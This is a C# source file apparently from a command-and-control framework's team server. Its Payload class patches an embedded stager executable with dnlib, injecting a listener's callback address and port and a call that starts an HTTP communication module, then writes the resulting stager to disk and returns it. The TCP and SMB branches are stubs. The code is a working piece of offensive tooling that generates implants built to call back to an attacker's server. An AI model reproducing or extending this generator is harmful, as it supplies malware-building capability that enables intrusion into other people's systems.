using dnlib.DotNet;
using dnlib.DotNet.Emit;

using Shared.Models;

using System;
using System.IO;
using System.Linq;
using TeamServer.Controllers;

namespace TeamServer.Models
{
    public class Payload
    {
        Listener Listener;
        CryptoController Crypto;

        public Payload(Listener Listener, CryptoController Crypto)
        {
            this.Listener = Listener;
            this.Crypto = Crypto;
        }

        public byte[] GenerateStager()
        {
            var stager = Helpers.GetEmbeddedResource("stager.exe");

            var md = ModuleDefMD.Load(stager);
            var stagerType = md.Types.FirstOrDefault(t => t.FullName.Equals("Stager.Stager", StringComparison.OrdinalIgnoreCase));
            var loadCommModuleMethod = stagerType.Methods.FirstOrDefault(m => m.FullName.Equals("System.Void Stager.Stager::LoadCommModule()", StringComparison.OrdinalIgnoreCase));

            switch (Listener.Type)
            {
                case Listener.ListenerType.HTTP:

                    var startHTTPCommModule = stagerType.Methods.FirstOrDefault(m => m.FullName.Equals("System.Void Stager.Stager::StartHTTPCommModule()", StringComparison.OrdinalIgnoreCase));
                    startHTTPCommModule.Body.Instructions[2].Operand = (Listener as ListenerHTTP).ConnectAddress;
                    startHTTPCommModule.Body.Instructions[3].OpCode = OpCodes.Ldc_I4;
                    startHTTPCommModule.Body.Instructions[3].Operand = (Listener as ListenerHTTP).ConnectPort;

                    loadCommModuleMethod.Body.Instructions.Insert(1, new Instruction
                    {
                        Offset = 1,
                        OpCode = OpCodes.Call,
                        Operand = startHTTPCommModule
                    });

                    loadCommModuleMethod.Body.Instructions[2].Offset = 2;

                    break;

                case Listener.ListenerType.TCP:

                    var startTCPCommModule = stagerType.Methods.FirstOrDefault(m => m.FullName.Equals("System.Void Stager.Stager::StartTCPCommModule()", StringComparison.OrdinalIgnoreCase));

                    break;

                case Listener.ListenerType.SMB:

                    var startSMBCommModule = stagerType.Methods.FirstOrDefault(m => m.FullName.Equals("System.Void Stager.Stager::StartSMBCommModule()", StringComparison.OrdinalIgnoreCase));

                    break;

                default:
                    break;
            }

            using (var ms = new MemoryStream())
            {
                md.Write(ms);
                File.WriteAllBytes(@"C:\Temp\stager.exe", ms.ToArray());
                return ms.ToArray();
            }
        }
    }
}